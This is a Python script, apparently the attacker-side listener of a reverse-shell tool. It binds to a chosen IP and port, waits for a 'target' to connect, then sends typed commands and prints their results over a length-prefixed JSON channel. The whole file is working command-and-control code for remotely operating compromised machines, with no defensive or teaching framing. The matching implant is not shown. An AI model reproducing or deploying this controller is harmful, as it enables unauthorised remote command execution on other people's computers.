import socket
import json

HOST = '192.168.0.103' #ip of your listening machine
PORT = 5445 #port on which you want to listen 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

print(f'[*] Listening on {HOST}:{PORT}')


def recv_exact(conn, n):
    """Receive exactly n bytes."""
    buf = b''
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('connection closed')
        buf += chunk
    return buf


def reliable_send(conn, data):
    raw = json.dumps(data).encode()
    conn.send(len(raw).to_bytes(8, 'big') + raw)


def reliable_recv(conn):
    length = int.from_bytes(recv_exact(conn, 8), 'big')
    return json.loads(recv_exact(conn, length).decode())


def target_communication(conn):
    while True:
        command = input('enter the command here: ')
        reliable_send(conn, command)
        if command == 'exit':
            break
        try:
            result = reliable_recv(conn)
            print(result)
        except (ConnectionError, json.JSONDecodeError) as e:
            print(f'[!] Error: {e}')
            break


while True:
    conn, ip = s.accept()
    print(f'[+] Target connected: {ip[0]}')
    try:
        target_communication(conn)
    except ConnectionError:
        print('[!] Connection lost')
    finally:
        conn.close()
        print('[*] Waiting for next connection...')